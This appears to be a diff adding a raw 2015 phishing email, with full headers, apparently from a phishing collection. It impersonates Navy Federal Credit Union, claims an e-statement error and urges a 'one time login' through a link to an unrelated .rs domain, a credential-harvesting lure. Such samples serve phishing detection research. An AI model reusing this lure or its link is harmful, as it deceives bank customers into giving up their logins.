@@ -1,0 +1,89 @@
+Return-Path: <navyfederalserver@nvx.org>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id E0CFDF4142
+	for <jose@login.monkey.org>; Wed, 29 Apr 2015 12:01:07 -0500 (CDT)
+Received: from smtpin12.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 9734E34E356
+	for <jose@login.monkey.org>; Wed, 29 Apr 2015 17:01:07 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70131690174.12.comb27_7e2ba6781794f
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 50,0,0,d66db0bfcaac95df,d41d8cd98f00b204,navyfederalserver@nvx.org,:navyfederalserver@nvx.org,RULES_HIT:41:72:379:474:962:967:969:973:978:979:983:988:989:1189:1208:1221:1254:1260:1263:1313:1314:1381:1394:1395:1431:1437:1516:1517:1518:1534:1539:1566:1575:1589:1594:1711:1714:1730:1777:1792:2108:2194:2199:2525:2560:2563:2682:2685:2741:2859:2890:2900:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3740:3867:3871:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4383:5007:6261:6678:6684:6687:6688:7652:9025:9059:9108:9388:9411:9416:9873:9908:10004:10049:10214:10400:11658:11855:11914:12043:12050:12561:13046:13095:13141:13163:13229:13230:13235:13237:14037:14096:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: comb27_7e2ba6781794f
+X-Filterd-Recvd-Size: 2703
+Received: from cmta17.telus.net (cmta17.telus.net [209.171.16.90])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Wed, 29 Apr 2015 17:01:06 +0000 (UTC)
+Received: from [172.20.10.3] ([96.1.32.103])
+	by cmta17.telus.net with TELUS
+	id Mt0a1q00R2DVxRs01t0cTx; Wed, 29 Apr 2015 11:01:06 -0600
+X-Authority-Analysis: v=2.0 cv=Va0pyiV9 c=1 sm=2
+ a=n0B9Q0onC45Og5O5rzwA6w==:17 a=W5Ebd4a_AAAA:8 a=FCcUBhJ3PRfIgv1AQBIA:9
+ a=wPNLvfGTeEIA:10 a=cPb-l3M05rgA:10 a=sXQck7XQkf0A:10 a=cGn92CUd3bkvGyqk:21
+ a=dBdU6KNAmx3tcD7O:21 a=1N_EqrujAAAA:8 a=bnyBK2ckAuf_kbdqKMsA:9
+ a=_W_S_7VecoQA:10 a=gnwq9KgPZsbeegmZ:21 a=n0B9Q0onC45Og5O5rzwA6w==:117
+X-Telus-Outbound-IP: 96.1.32.103
+Content-Type: multipart/alternative; boundary="===============0307818553=="
+MIME-Version: 1.0
+Subject: Your Navy Federal Account e-statement is currently unavailable!
+To: Recipients <NavyFederalServer@nvx.org>
+From: "Navy Federal" <NavyFederalServer@nvx.org>
+Date: Wed, 29 Apr 2015 18:00:34 +0100
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 74
+
+You will not see this in a MIME-aware mail reader.
+--===============0307818553==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Dear Navy Federal Member:
+ =
+
+Your Navy Federal Online Banking e-statement is currently unavailable to vi=
+ew online, due to error(s) detected on your account.
+ =
+
+Customers who have received this message are required to perform a one time=
+ login operation to enable them to view monthly e-statements.
+ =
+
+Kindly click here to proceed.
+ =
+
+Best Wishes,
+ Online Banking Service
+Navy Federal Credit Union
+
+ =20
+
+--===============0307818553==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><BODY><P><FONT face=3D"Trebuchet MS">Dear Navy Federal Member:</FONT>=
+</P>
+<P><BR><FONT face=3D"Trebuchet MS">Your Navy Federal Online Banking e-state=
+ment is currently unavailable to view online, due to error(s) detected on y=
+our account.</FONT></P>
+<P><BR><FONT face=3D"Trebuchet MS">Customers who have received this message=
+ are required to perform a one time login operation to enable them to view =
+monthly e-statements.</FONT></P>
+<P><BR><FONT face=3D"Trebuchet MS">Kindly <A href=3D"http://sida.org.rs/med=
+ia/system/images/">click here to proceed.</A></FONT></P>
+<P><BR><FONT face=3D"Trebuchet MS">Best Wishes,</FONT></P>
+<P><FONT face=3D"Trebuchet MS">Online Banking Service<BR>Navy Federal Credi=
+t Union<BR></FONT></P>
+<P><FONT face=3D"Trebuchet MS"></FONT>&nbsp;</P></BODY></HTML>
+--===============0307818553==--
